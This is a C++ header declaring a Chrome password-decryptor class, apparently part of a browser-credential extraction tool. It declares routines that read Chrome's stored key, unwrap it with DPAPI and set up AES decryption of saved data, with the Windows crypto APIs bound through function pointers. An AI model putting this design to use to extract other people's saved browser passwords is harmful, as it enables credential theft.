#pragma once
#include <cJson.h>

#include "Forwards.h"
#include "IDecryptor.h"
#include <FileOperations.h>

#define DPAPI_PREFIX_LEN 5
#define MAX_SIZE_PASS 1*1024

class ChromeDecryptor : public IDecryptor 
{
public:
	ChromeDecryptor();
    ~ChromeDecryptor() override;	
	bool init(const String& sPath) override;
    bool decrypt_data(const String& encrypted_data, String& decrypted_data) override;

    void set_password_size(int size);
private:

    bool get_chrome_key(std::string& key, unsigned long& keySize, const String& chromium_path);
    bool get_key_path(String& keyPath, const String& chromium_path);
    bool key_decrypt(std::string keyBase64, DWORD keySize, char* decKey);
    bool dpapi_decrypt(unsigned char* encText, unsigned long encTextSize, char* decText);

    bool init_for_chrome_80();

    bool init_key_for_chrome_80(PBYTE pbKey, ULONG sizeKey);


    cJSON* find_os_crypt_node(cJSON* input_node, const char* pattern);

	
    BCRYPT_ALG_HANDLE m_hAlg;
    BCRYPT_KEY_HANDLE m_hKey;
    int m_password_size = 0;
    char* m_pbOutput = nullptr;

   
    std::function<f_BCryptDecrypt>                  m_BCryptDecrypt;
    std::function<f_CryptUnprotectData>             m_CryptUnprotectData;
    std::function<f_BCryptOpenAlgorithmProvider>    m_BCryptOpenAlgorithmProvider;
    std::function<f_BCryptSetProperty>              m_BCryptSetProperty;
	std::function<f_BCryptGenerateSymmetricKey>     m_BCryptGenerateSymmetricKey;
	
};


